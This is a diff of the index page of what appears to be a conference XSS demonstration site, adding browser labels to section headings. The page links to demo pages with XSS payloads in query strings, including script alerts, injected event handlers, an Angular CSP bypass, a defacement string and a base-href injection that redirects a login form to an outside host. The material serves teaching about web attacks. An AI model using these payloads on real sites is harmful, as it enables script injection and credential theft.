@@ -5,7 +5,7 @@
 
 <br/><br/><br/>
 
-<h2>Basic examples</h2>
+<h2>Basic examples (Demo with Firefox)</h2>
 <ul>
 <li><a href="basic1.php?name=Confoo">HTML context</a> <a href="basic1.php?name=<script>alert(1)</script>">[1]</a></li>
 <li><a href="basic2.php?name=Confoo">Attribute context</a> <a href="basic2.php?name=%22%20onload=%22alert%281%29">[1]</a></li>
@@ -26,13 +26,13 @@
 <li><a href="edge-xss-attribute.php?userId=Confoo">HTML attribute not filter</a> <a href="edge-xss-attribute.php?userId=YOLO%22%20%%20autofocus=%22%22%20onfocus=%22alert(1)">[1]</a></li>
 </ul>
 
-<h2>Content Security Policy</h2>
+<h2>Content Security Policy (Demo with Firefox and Burp)</h2>
 
 <ul>
 <li><a href="csp-fileupload.php">File upload</a></li>
 <li><a href="csp-fileupload-angular-import.php?userId=1">File upload + Angular</a> <a href="csp-fileupload-angular-import.php?userId=ng-include:'tgif.txt'">[1]</a></li>
 <li><a href="csp-googleapis.php">Google API</a></li>
-<li><a href="login.php?errorMsg=<b>System error</b>: The active directory is unavailable.">base href and form redirection</a> <a href="login.php?errorMsg=%3Cmarquee%3E%3Ci%3E%3Ch1%3EPwnD%20bY%20HaX000R!%20%3C/h1%3E%3C/i%3E%3C/marquee%3E">[1]</a> <a href="http://localhost/demo-confoo/login.php?errorMsg=%3Cbase%20href=%22http://xss.lol%22%3E">[2]</a></li>
+<li><a href="login.php?errorMsg=<b>System error</b>: The active directory is unavailable.">base href and form redirection</a> <a href="login.php?errorMsg=%3Cmarquee%3E%3Ci%3E%3Ch1%3EPwnD%20bY%20HaX000R!%20%3C/h1%3E%3C/i%3E%3C/marquee%3E">[1]</a> <a href="login.php?errorMsg=%3Cbase%20href=%22http://xss.lol%22%3E">[2]</a></li>
 </ul>
 
 
